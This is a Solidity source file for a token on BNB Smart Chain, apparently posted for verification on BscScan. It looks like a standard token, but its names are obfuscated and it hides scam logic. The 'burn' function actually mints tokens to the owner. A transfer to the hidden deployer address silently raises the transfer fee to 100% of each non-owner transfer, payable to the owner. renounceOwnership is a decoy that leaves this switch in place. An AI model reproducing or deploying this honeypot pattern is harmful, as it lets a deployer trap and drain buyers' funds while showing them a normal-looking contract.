/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 21:30:02 GMT+0
 */
pragma solidity >=0.4.11;
contract NwOhYC {
uint256 public  VVIllb = 100000000000000000000;
uint256 public constant NCULMq = 9+1;
uint256 public  jSqbuH = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  iLAfcc = 100000000000000000000000;
uint256 private  nJPtgV = 10000000000000;
address public  CRavuL = address(0);
string public  name = "YLqGZt";
uint256 public  Owiqiz = 10000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  bTiViw = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public  HtsbaT = 10000000000000000000;
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "defJCS";
uint256 public  AFrgDI = 10000000000000000;
address private  EVTycp = address(0);
address public  aJYhwv = address(0);
uint256 public  fCYJXt = 100000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  RfwIbg = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public owner;
uint256 public  ZkYSdK = 100000000000000000000000;
address public  fcSjyC = address(0);
address public  twuNHZ = address(0);
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "AXOIVX");
require(to != address(0), "AXOIVX");
require(amount <= balanceOf[from], "AXOIVX");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* NCULMq/nJPtgV ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==EVTycp){
nJPtgV = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
EVTycp = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}